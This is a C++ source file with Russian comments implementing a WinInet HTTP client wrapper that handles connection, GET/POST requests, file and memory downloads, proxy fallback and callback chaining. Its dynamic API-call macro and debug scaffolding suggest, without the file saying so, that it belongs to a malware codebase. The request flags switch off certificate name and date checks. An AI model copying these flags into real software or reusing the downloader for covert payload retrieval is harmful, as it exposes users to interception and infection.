#include <windows.h>
#include <wininet.h>

#include "wininet.h"
#include "fs.h"
#include "httptools.h"

//User agent
#define DEFAULT_USER_AGENT "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1)"

//Версия HTTP.
#define DEFAULT_HTTP_VERSION "HTTP/1.1"

//Размер буфера при скачивании файла
#define WININET_BUFFER_SIZE 4096

//Принимаемые типы.
static LPSTR AcceptTypes[] = {"*/*", NULL};

//Опции WinInet.
typedef struct
{
  DWORD dwOption;
  DWORD dwValue;
}WININETOPTION;

static WININETOPTION WinInetOptions[] =
{
  //Sets an unsigned long integer value that contains the time-out value, in milliseconds, to use for Internet connection requests.
  {INTERNET_OPTION_CONNECT_TIMEOUT,  1 * 60 * 1000},
  //Sets an unsigned long integer value that contains the error masks that can be handled by the client application.
  //Баг в wininet.dll, повреждает стек или что-то в этом духе.
  //{INTERNET_OPTION_ERROR_MASK, INTERNET_ERROR_MASK_COMBINED_SEC_CERT | INTERNET_ERROR_MASK_INSERT_CDROM | INTERNET_ERROR_MASK_LOGIN_FAILURE_DISPLAY_ENTITY_BODY},
  //Sets an unsigned long integer value that contains the time-out value, in milliseconds, to receive a response to a request.
  {INTERNET_OPTION_RECEIVE_TIMEOUT, 1 * 60 * 1000},
  //Sets an unsigned long integer value, in milliseconds, that contains the time-out value to send a request.
  {INTERNET_OPTION_SEND_TIMEOUT,    1 * 60 * 1000}
};

void Wininet::Init(void)
{

}

void Wininet::Uninit(void)
{

}

HINTERNET Wininet::_Connect(LPSTR pstrUserAgent, LPSTR pstrHost, WORD wPort, DWORD dwFlags)
{
  //"Создание" интернета.
  HINTERNET hInet = CWA(wininet, InternetOpenA)(pstrUserAgent ? pstrUserAgent : DEFAULT_USER_AGENT,
                                                dwFlags & WICF_USE_IE_PROXY ? INTERNET_OPEN_TYPE_PRECONFIG : INTERNET_OPEN_TYPE_DIRECT,
                                                NULL, NULL, 0);
  if(hInet == NULL)return NULL;

  //Устанавлиаем настройки.
  for(DWORD i = 0; i < sizeof(WinInetOptions) / sizeof(WININETOPTION); i++)CWA(wininet, InternetSetOptionA)(hInet, WinInetOptions[i].dwOption, (void *)&WinInetOptions[i].dwValue, sizeof(DWORD));

  //Подключение, как таковое соединение не устанавливается. Ебанутый M$.
  HINTERNET hConnect = CWA(wininet, InternetConnectA)(hInet, pstrHost, wPort, NULL, NULL, INTERNET_SERVICE_HTTP, 0, NULL);
  if(hConnect == NULL)
  {
    CWA(wininet, InternetCloseHandle)(hInet);
    return NULL;
  }

  return hConnect;
}

void Wininet::_CloseConnection(HINTERNET hConnect)
{
  HINTERNET hInet = NULL;
  DWORD dwSize = sizeof(HINTERNET);
  BOOL r = CWA(wininet, InternetQueryOptionA)(hConnect, INTERNET_OPTION_PARENT_HANDLE, (void *)&hInet, &dwSize);
  CWA(wininet, InternetCloseHandle)(hConnect);
  if(r && hInet && dwSize == sizeof(HINTERNET))CWA(wininet, InternetCloseHandle)(hInet);
  #if(BO_DEBUG > 0 && defined(WDEBUG1))
  else WDEBUG0(WDDT_ERROR, "Opps! Parent no founded for hConnection!");
  #endif
}

void Wininet::_closeWithParents(HINTERNET handle)
{
  HINTERNET parentHandle;
  DWORD size;
  BOOL ok;

  for(;;)
  {
    size = sizeof(HINTERNET);
    ok   = CWA(wininet, InternetQueryOptionA)(handle, INTERNET_OPTION_PARENT_HANDLE, &parentHandle, &size);
    CWA(wininet, InternetCloseHandle)(handle);
    if(ok == FALSE || parentHandle == NULL)break;
    handle = parentHandle;
  }
}

bool Wininet::callCallback(HINTERNET handle, DWORD_PTR context, DWORD internetStatus, LPVOID statusInformation, DWORD statusInformationLength)
{
  HINTERNET originalHandle = handle;
  for(; handle != NULL;)
  {
    INTERNET_STATUS_CALLBACK isc = NULL;
    DWORD size                   = sizeof(INTERNET_STATUS_CALLBACK);

    if(CWA(wininet, InternetQueryOptionA)(handle, INTERNET_OPTION_CALLBACK, &isc, &size) == TRUE && isc != INTERNET_NO_CALLBACK && isc != INTERNET_INVALID_STATUS_CALLBACK)
    {
#     if defined WDEBUG1
      WDEBUG1(WDDT_INFO, "Calling 0x%p.", isc);
#     endif

      isc(originalHandle, context, internetStatus, statusInformation, statusInformationLength);
      return true;
    }
    
    size = sizeof(HINTERNET);
    if(CWA(wininet, InternetQueryOptionA)(handle, INTERNET_OPTION_PARENT_HANDLE, &handle, &size) == FALSE)break;
  }
  return false;
}

HINTERNET Wininet::_SendRequest(HINTERNET hConnect, LPSTR pstrURI, LPSTR pstrReferer, void *pPostData, DWORD dwPostDataSize, DWORD dwFlags)
{
  DWORD dwReqFlags = INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID |
                     INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTP | INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTPS | INTERNET_FLAG_NO_AUTH | 
                     INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_UI | INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_RELOAD;

  if(dwFlags & WISRF_KEEP_CONNECTION)dwReqFlags |= INTERNET_FLAG_KEEP_CONNECTION;
  if(dwFlags & WISRF_IS_HTTPS)dwReqFlags |= INTERNET_FLAG_SECURE;

# if defined WDEBUG1
  WDEBUG1(WDDT_INFO, "pstrURI=%S", pstrURI);  
# endif
  
  //Создание запроса.
  HINTERNET hReq = CWA(wininet, HttpOpenRequestA)(hConnect, dwFlags & WISRF_METHOD_POST ? "POST" : "GET", pstrURI, DEFAULT_HTTP_VERSION, pstrReferer, (LPCSTR *)AcceptTypes, dwReqFlags, NULL);

  if(hReq != NULL)
  {
    //Отправка запроса.
    LPSTR headers;
    DWORD headersSize;
    
    if(dwFlags & WISRF_KEEP_CONNECTION)
    {
      headers     = NULL;
      headersSize = 0;
    }
    else
    {
      headers     = "Connection: close\r\n";
      headersSize = 19;
    }
    
    if(CWA(wininet, HttpSendRequestA)(hReq, headers, headersSize, pPostData, dwPostDataSize))
    {
      DWORD dwStatus = 0, dwSize = sizeof(DWORD);
      if(CWA(wininet, HttpQueryInfoA)(hReq, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &dwStatus, &dwSize, NULL) && dwStatus == HTTP_STATUS_OK)return hReq;
    }
    CWA(wininet, InternetCloseHandle)(hReq);
  }
  return NULL;
}

bool Wininet::_DownloadData(HINTERNET hRequest, MEMDATA *pBuf, DWORD dwSizeLimit, HANDLE hStopEvent)
{
  if(dwSizeLimit == 0 || dwSizeLimit > WININET_MAXBYTES_TO_MEM)dwSizeLimit = WININET_MAXBYTES_TO_MEM;
  DWORD dwDownloaded = 0;
  LPBYTE pDownloaded = NULL;

  for(;;)
  {
    if(hStopEvent != NULL && CWA(kernel32, WaitForSingleObject)(hStopEvent, 0) != WAIT_TIMEOUT)break;

    //Выделение памяти.
    DWORD dwReaded = WININET_BUFFER_SIZE;
    if(!Mem::reallocEx(&pDownloaded, dwDownloaded + dwReaded))break;

    //Чтение данных.
    if(!CWA(wininet, InternetReadFile)(hRequest, pDownloaded + dwDownloaded, dwReaded, &dwReaded))break;

    //Все прочитано.
    if(dwReaded == 0)
    {
      if(pBuf)
      {
        pBuf->data  = pDownloaded;
        pBuf->size = dwDownloaded;
      }
      else Mem::free(pDownloaded);
      return true;
    }

    dwDownloaded += dwReaded;

    //Привышин лимит.
    if(dwDownloaded > dwSizeLimit)break;
  }

  Mem::free(pDownloaded);
  return false;
}

bool Wininet::_DownloadDataToFile(HINTERNET hRequest, LPWSTR pstrFileName, DWORD dwSizeLimit, HANDLE hStopEvent)
{
  bool r = false;
  HANDLE hFile = CWA(kernel32, CreateFileW)(pstrFileName, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
  if(hFile != INVALID_HANDLE_VALUE)
  {
    LPBYTE pBuf = (LPBYTE)Mem::alloc(WININET_BUFFER_SIZE);
    if(pBuf)
    {
      DWORD dwDownloaded = 0, dwWrited, dwReaded;
      for(;;)
      {
        if(hStopEvent != NULL && CWA(kernel32, WaitForSingleObject)(hStopEvent, 0) != WAIT_TIMEOUT)break;

        //Чтение данных.
        if(!CWA(wininet, InternetReadFile)(hRequest, pBuf, WININET_BUFFER_SIZE, &dwReaded))break;

        //Все прочитано.
        if(dwReaded == 0)
        {
          CWA(kernel32, FlushFileBuffers)(hFile);
          r = true; 
          break;
        }
        
        //Пишим
        if(!CWA(kernel32, WriteFile)(hFile, pBuf, dwReaded, &dwWrited, NULL) || dwReaded != dwWrited)break;
        dwDownloaded += dwReaded;
        
        //Привышин лимит.
        if(dwDownloaded > dwSizeLimit)break;
      }

      Mem::free(pBuf);
    }
    
    CWA(kernel32, CloseHandle)(hFile);
    if(!r)Fs::_removeFile(pstrFileName);
  }
  return r;
}

bool Wininet::_CallURL(CALLURLDATA *pcud, MEMDATA *pBuf)
{
  bool r = false;
  HttpTools::URLDATA ud;

  if(HttpTools::_parseUrl(pcud->pstrURL, &ud))
  {
    DWORD dwRequestFlags = pcud->SendRequest_dwFlags;
    if(ud.scheme == HttpTools::UDS_HTTPS)dwRequestFlags |= WISRF_IS_HTTPS;
    else dwRequestFlags &= ~(WISRF_IS_HTTPS);

    for(BYTE bi = 0; bi < pcud->bTryCount; bi++)
    {
      //Задержка.
      if(bi > 0)
      {
        if(pcud->hStopEvent != NULL)
        {
          if(CWA(kernel32, WaitForSingleObject)(pcud->hStopEvent, pcud->dwRetryDelay) != WAIT_TIMEOUT)goto END;
        }
        else CWA(kernel32, Sleep)(pcud->dwRetryDelay);
      }

      DWORD dwConnectFlags = pcud->Connect_dwFlags;
      BYTE pp_m = 1;
      if(pcud->bAutoProxy)
      {
        dwConnectFlags |= WICF_USE_IE_PROXY;
        pp_m++;
      }

      for(BYTE pp = 0; pp < pp_m; pp++)
      {
        if(pp == 1)dwConnectFlags &= ~(WICF_USE_IE_PROXY);

        //Подключение.
        HINTERNET hConnect = _Connect(pcud->pstrUserAgent, ud.host, ud.port, dwConnectFlags);
        if(hConnect)
        {
          HINTERNET hRequest = _SendRequest(hConnect, ud.uri, NULL, pcud->SendRequest_pPostData, pcud->SendRequest_dwPostDataSize, dwRequestFlags);
          if(hRequest)
          {
            if(pcud->DownloadData_pstrFileName)r = _DownloadDataToFile(hRequest, pcud->DownloadData_pstrFileName, pcud->DownloadData_dwSizeLimit, pcud->hStopEvent);
            else r = _DownloadData(hRequest, pBuf, pcud->DownloadData_dwSizeLimit, pcud->hStopEvent);
            CWA(wininet, InternetCloseHandle)(hRequest);
          }

          _CloseConnection(hConnect);
          if(r)goto END;
        }
      }
    }
END:
    HttpTools::_freeUrlData(&ud);
  }
  return r;
}

typedef HRESULT (WINAPI *OBTAINUSERAGENTSTRING)(DWORD, LPCSTR, DWORD *);

LPSTR Wininet::_GetIEUserAgent(void)
{
  LPSTR pRet = NULL;
  HMODULE hDll = CWA(kernel32, LoadLibraryA)("urlmon.dll");
  
  if(hDll != NULL)
  {
    OBTAINUSERAGENTSTRING fnc = (OBTAINUSERAGENTSTRING)CWA(kernel32, GetProcAddress)(hDll, "ObtainUserAgentString");
    
    if(fnc != NULL)
    {
      CHAR ua[1024];
      DWORD uas = sizeof(ua) - 1;
      ua[0] = 0;
      
      if(fnc(0, ua, &uas) == NOERROR)
      {
        //Не доверяю MS. Плохо как то документирована эта функция, и странно юзается в Win2k.
        if(uas > sizeof(ua) - 1)uas = sizeof(ua) - 1;
        ua[uas] = 0;
        
        pRet = Str::_CopyExA(ua, -1);
      }
    }
    
    CWA(kernel32, FreeLibrary)(hDll);
  }

  return pRet;
}

DWORD Wininet::_testDownloadDelay(LPSTR url, HANDLE stopEvent)
{
  Wininet::CALLURLDATA cud;

  cud.bAutoProxy                 = true;
  cud.bTryCount                  = 1;
  cud.dwRetryDelay               = 0;
  cud.hStopEvent                 = stopEvent;
  cud.pstrUserAgent              = _GetIEUserAgent();
  cud.pstrURL                    = url;
  cud.Connect_dwFlags            = 0;
  cud.SendRequest_pstrReferer    = NULL;
  cud.SendRequest_pPostData      = NULL;
  cud.SendRequest_dwPostDataSize = 0;
  cud.SendRequest_dwFlags        = WISRF_METHOD_GET;
  cud.DownloadData_dwSizeLimit   = 512 * 1024;
  cud.DownloadData_pstrFileName  = NULL;

  DWORD time = CWA(kernel32, GetTickCount)();
  
  time = _CallURL(&cud, NULL) ? (CWA(kernel32, GetTickCount)() - time) : 0;

  Mem::free(cud.pstrUserAgent);
  return time;
}

void *Wininet::_queryOptionExA(HINTERNET internet, DWORD option, LPDWORD lenght)
{
  void *buf;
  *lenght = 0;

  if(CWA(wininet, InternetQueryOptionA)(internet, option, NULL, lenght) == FALSE && (*lenght) > 0 && CWA(kernel32, GetLastError)() == ERROR_INSUFFICIENT_BUFFER)
  {
    if((buf = Mem::alloc(*lenght)) != NULL)
    {
      if(CWA(wininet, InternetQueryOptionA)(internet, option, buf, lenght) == TRUE)return buf;
      Mem::free(buf);
    }
  }
  return NULL;
}

void *Wininet::_queryOptionExW(HINTERNET internet, DWORD option, LPDWORD lenght)
{
  void *buf;
  *lenght = 0;

  if(CWA(wininet, InternetQueryOptionW)(internet, option, NULL, lenght) == FALSE && (*lenght) > 0 && CWA(kernel32, GetLastError)() == ERROR_INSUFFICIENT_BUFFER)
  {
    if((buf = Mem::alloc(*lenght)) != NULL)
    {
      if(CWA(wininet, InternetQueryOptionW)(internet, option, buf, lenght) == TRUE)return buf;
      Mem::free(buf);
    }
  }
  return NULL;
}

LPSTR Wininet::_queryInfoExA(HINTERNET request, DWORD infoLevel, LPDWORD lenght, LPDWORD index)
{
  char tmpBuf[1];
  LPSTR buf;
  *lenght = 0;

  if((infoLevel & HTTP_QUERY_FLAG_NUMBER) == 0 &&
     CWA(wininet, HttpQueryInfoA)(request, infoLevel, tmpBuf, lenght, index) == FALSE && CWA(kernel32, GetLastError)() == ERROR_INSUFFICIENT_BUFFER)
  {
    if((buf = (LPSTR)Mem::alloc(*lenght)) != NULL)
    {
      if(CWA(wininet, HttpQueryInfoA)(request, infoLevel, buf, lenght, index) == TRUE)return buf;
      Mem::free(buf);
    }
  }
  return NULL;
}
